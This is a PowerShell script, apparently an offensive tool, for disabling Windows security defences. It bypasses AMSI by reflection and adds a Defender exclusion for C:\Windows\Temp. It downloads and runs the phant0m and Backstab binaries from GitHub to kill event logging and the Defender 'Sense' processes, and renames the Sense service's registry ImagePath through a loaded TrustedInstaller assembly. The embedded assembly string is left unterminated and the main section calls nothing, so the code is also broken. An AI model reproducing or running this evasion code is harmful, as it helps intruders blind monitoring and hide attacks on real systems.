function GoingDark() {
    $goingdark = "X19fICBfX19fIF9fX18gXyAgXyBfX19fICAgIF9fX18gXyBfICBfICAgICAgX19fXyBfX19fIF8gXyAgXyBfX19fICAgIF9fXyAgX19fXyBfX19fIF8gIF8gDQp8X19dIHxfXy8gfF9ffCB8ICB8IHwgIHwgICAgW19fICB8ICBcLyAgICAgICB8IF9fIHwgIHwgfCB8XCB8IHwgX18gICAgfCAgXCB8X198IHxfXy8gfF8vICANCnxfX10gfCAgXCB8ICB8ICBcLyAgfF9ffCAgICBfX19dIHwgXy9cXyAuICAgIHxfX10gfF9ffCB8IHwgXHwgfF9fXSAgICB8X18vIHwgIHwgfCAgXCB8IFxfIA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICcgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICA="
    Write-Host([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($goingdark)))
    Write-Host "-... .-. .- ...- ---    ... .. -..- --..--    --. --- .. -. --.    -.. .- .-. -.- "

    # disable Amsi
    Write-Host "[i] Disabling Amsi"
    $t = [Ref].Assembly.GetTypes() | foreach {if ($_.Name -like "*iUtils") {$u=$_}}
    $fs = $u.GetFields('NonPublic,Static') | foreach {if ($_.Name -like "*InitFailed") {$f=$_}}
    $f.SetValue($null,$true)

    # setting Windows Defender to exclude the current directory
    Write-Host "[i] Setting Windows Defender to exclude the C:\Windows\Temp directory"
    Add-MpPreference -ExclusionPath "C:\Windows\Temp"
    $downloadDirectory = "C:\Windows\Temp"

    # phanth0m disable event log
    Write-Host "[i] Disabling Event Log"
    Write-Host "[i] Downloading phanth0m"
    Invoke-WebRequest -Uri https://github.com/RFC1918-hub/RFCRandom/raw/main/phant0m-exe.exe -OutFile $downloadDirectory\phant0m-exe.exe
    Write-Host "[i] Running phanth0m"
    & $downloadDirectory\phant0m-exe.exe

    BravoSix

    # backstab to kill defender processes
    Write-Host "[i] Downloading backstab"
    Invoke-WebRequest https://github.com/RFC1918-hub/RFCRandom/raw/main/Backstab.exe -OutFile $downloadDirectory\Backstab.exe
    Write-Host "[i] Running backstab"
    # killing all sense processes
    Write-Host "[i] Killing all Sense processes"
    Get-Process | Where-Object {$_.ProcessName -like "*Sense*"} | ForEach-Object {& $downloadDirectory\Backstab.exe -n $_.Id -k}
}

function BravoSix() {
    
    TrustedInstaller
    # disable Windows Defender services
    $defenderServices = @("Sense")
    $powershellPath = "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
    $servicesRegPath = "HKLM:\SYSTEM\CurrentControlSet\Services\"

    foreach ($service in $defenderServices) {
        Write-Host "[i] Disabling $service service..."
        Write-Host "[i] Renaming $service service ImagePath type to BravoSix ..."
        Write-Host "[i] Original ImagePath value: $((Get-ItemProperty -Path $servicesRegPath$service).ImagePath)"
        $powershellCmd = "Rename-ItemProperty -Path $servicesRegPath$service -Name ImagePath -NewName BravoSix"
        $powershellBytes = [System.Text.Encoding]::Unicode.GetBytes($powershellCmd)
        $powershellEncoded = [System.Convert]::ToBase64String($powershellBytes)
        [TrustedInstaller.Program]::Main("$powershellPath -e $powershellEncoded")
        Write-Host "[i] New ImagePath value: $((Get-ItemProperty -Path $servicesRegPath$service).BravoSix)"
        Write-Host
        Write-Host
    }
}

function BravoCleanup() {
    TrustedInstaller
    # enable Windows Defender services
    $defenderServices = @("Sense")
    $powershellPath = "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
    $servicesRegPath = "HKLM:\SYSTEM\CurrentControlSet\Services\"

    foreach ($service in $defenderServices) {
        Write-Host "[i] Disabling $service service..."
        Write-Host "[i] Renaming $service service BravoSix type to ImagePath ..."
        Write-Host "[i] Original ImagePath value: $((Get-ItemProperty -Path $servicesRegPath$service).BravoSix)"
        $powershellCmd = "Rename-ItemProperty -Path $servicesRegPath$service -Name BravoSix -NewName ImagePath"
        $powershellBytes = [System.Text.Encoding]::Unicode.GetBytes($powershellCmd)
        $powershellEncoded = [System.Convert]::ToBase64String($powershellBytes)
        [TrustedInstaller.Program]::Main("$powershellPath -e $powershellEncoded")
        Write-Host "[i] New ImagePath value: $((Get-ItemProperty -Path $servicesRegPath$service).ImagePath)"
        Write-Host
        Write-Host
    }

    # cleaning up downloadables
    $downloadDirectory = "C:\Windows\Temp"
    Remove-Item -Path $downloadDirectory\phant0m-exe.exe -Force | Out-Null
    Remove-Item -Path $downloadDirectory\Backstab.exe -Force | Out-Null
    Remove-MpPreference -ExclusionPath "C:\Windows\Temp"
}

function TrustedInstaller() {
    $trustedInstaller = "

    [System.Reflection.Assembly]::Load([Convert]::FromBase64String($trustedInstaller)) | Out-Null
}

# Main
if (-not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) {
    Write-Warning "You must be an Administrator to run this script."
    return
}
